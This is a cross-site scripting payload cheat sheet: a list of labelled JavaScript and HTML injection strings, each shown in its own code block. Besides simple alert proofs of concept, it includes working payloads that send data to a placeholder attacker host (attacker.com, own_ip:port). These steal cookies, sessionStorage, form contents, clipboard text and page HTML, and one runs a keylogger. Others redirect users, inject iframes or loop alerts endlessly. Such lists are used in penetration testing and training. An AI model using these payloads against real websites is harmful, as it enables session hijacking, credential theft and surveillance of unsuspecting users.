
**Simple alert popup:** Displays a JavaScript alert box.

```javascript
<script>alert('XSS')</script>
```

**Simple alert popup with basic filter evasion:** Displays a JavaScript alert box.

```javascript
"><script>alert('XSS')</script><!--
```

**Classic image tag with onerror:** Executes code when the image fails to load.

```javascript
<img src='x' onerror=alert('XSS')>
```

**Event handler exploitation:** Executes JavaScript through click events.

```javascript
<img src="<valid url>" onclick=alert("hi") />
```

**Cookie theft:** Sends cookies to an attacker-controlled server.

```javascript
<img src=x onerror=fetch("own_ip:port/"+document.cookie);>
```

**Alert with cookies:** Shows the user's cookies in an alert box.

```javascript
<script>alert(document.cookie)</script>
```
**URL redirection:** Redirects the user to a malicious site.

```javascript
<script>window.location.replace('http://attacker.com');</script>
```

**SVG tag with JavaScript:** Executes JavaScript inside an SVG.

```javascript
<svg onload=alert('XSS')>
```

**Keylogger:** Captures and exfiltrates keystrokes.

```javascript
<script>document.onkeypress = function(e) { fetch('http://attacker.com/log?key=' + e.key); }</script>
```

**Session storage theft:** Steals sessionStorage data.

```javascript
<script>fetch('http://attacker.com/steal?session=' + JSON.stringify(sessionStorage));</script>
```

**DOM modification:** Injects content into the page.

```javascript
<script>document.body.innerHTML = '<h1>Hacked!</h1>';</script>
```

**Form exfiltration:** Captures form input and sends it to an attacker.

```javascript
<script>fetch('http://attacker.com/form?data=' + new URLSearchParams(new FormData(document.forms[0])));</script>
```

**IFrame injection:** Embeds a malicious iframe.

```javascript
<script>document.body.innerHTML += '<iframe src="http://attacker.com"></iframe>';</script>
```

**Browser fingerprinting:** Gathers browser and system info.

```javascript
<script>fetch('http://attacker.com/info?ua=' + navigator.userAgent);</script>
```

**Clipboard theft:** Reads and exfiltrates clipboard contents.

```javascript
<script>navigator.clipboard.readText().then(text => fetch('http://attacker.com/clipboard?data=' + text));</script>
```

**Alert loop:** Creates an infinite alert loop.

```javascript
<script>while(true) { alert('XSS!'); }</script>
```

**CSS-based XSS (with style tags):** Injects malicious CSS.

```javascript
<style>body { background: url('http://attacker.com/bg.png'); }</style>
```

**Storage-based XSS:** Stores payload in localStorage.

```javascript
<script>localStorage.setItem('XSS', '<script>alert(1)</script>');</script>
```

**XHR abuse:** Sends sensitive data via XMLHttpRequest.

```javascript
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://attacker.com/steal?data=' + document.body.innerHTML);
xhr.send();
</script>
```

